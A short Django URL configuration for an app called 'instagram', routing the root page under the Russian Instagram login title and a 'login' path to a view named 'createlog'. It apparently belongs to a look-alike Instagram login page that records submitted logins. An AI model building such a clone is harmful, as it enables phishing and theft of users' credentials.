from django.urls import path
from instagram.views import *

urlpatterns = [
    path('', insta, name="Войти • Instagram") ,
    path('login', createlog , name='login'),
    
]